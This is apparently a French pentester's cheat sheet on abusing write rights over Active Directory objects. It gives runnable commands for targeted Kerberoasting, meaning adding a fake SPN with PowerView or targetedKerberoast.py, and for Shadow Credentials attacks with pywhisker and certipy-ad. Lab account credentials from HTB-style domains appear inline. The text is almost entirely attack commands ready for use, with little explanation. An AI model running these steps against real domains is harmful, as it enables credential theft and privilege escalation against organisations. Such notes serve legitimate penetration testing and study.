
> [!TIP]
> Permet d'écrire n'importe quel attribut sur l'objet

Exploitations possibles:

Users :
- Targeted Kerberoasting
- Shadow Credentials

Groups:
- AddMember


# 1. Targeted Kerberoasting

> [!TIP]
> Ajouter un SPN au user afin de le kerberoast

## LINUX

### TargetedKerberoast

```
python3 targetedKerberoast.py -v -d "$DOMAIN_NAME" -u "$USER" -p "$PASSWORD" --dc-ip $DCIP --request-user $TARGETUSER
```

auth kerberos

```
python3 targetedKerberoast.py -v -d "$DOMAIN_NAME" -u "$USER" -p "$PASSWORD" -k --dc-host $DCHOSTNAME --request-user $TARGETUSER
```




## WINDOWS

### PowerView

1. S'authentifier avec le compte ayant les droits

```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```

2. Importer PowerView

```powershell
Import-Module .\PowerView.ps1
```

3. vérifier que la target n'a pas de SPN

```powershell
Get-DomainUser 'adunn' | Select serviceprincipalname
```

4. Ajouter le SPN au user

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

5. Kerberoasting -> [[POWERVIEW#1. KERBEROASTING]] 

6. Supprimer le SPN

```powershell-session
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```


# 2. Shadow Credentials

## PyWhisker


```bash
python3 pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"
```


## Certipy-AD #ShadowCredentials+ #UnPACTheHash 

```bash
sudo certipy-ad shadow auto -username 'd.anderson@infiltrator.htb' -p 'WAT?watismypass!' -k -account e.rodriguez -dc-ip 10.10.11.31 -target dc01.infiltrator.htb
```
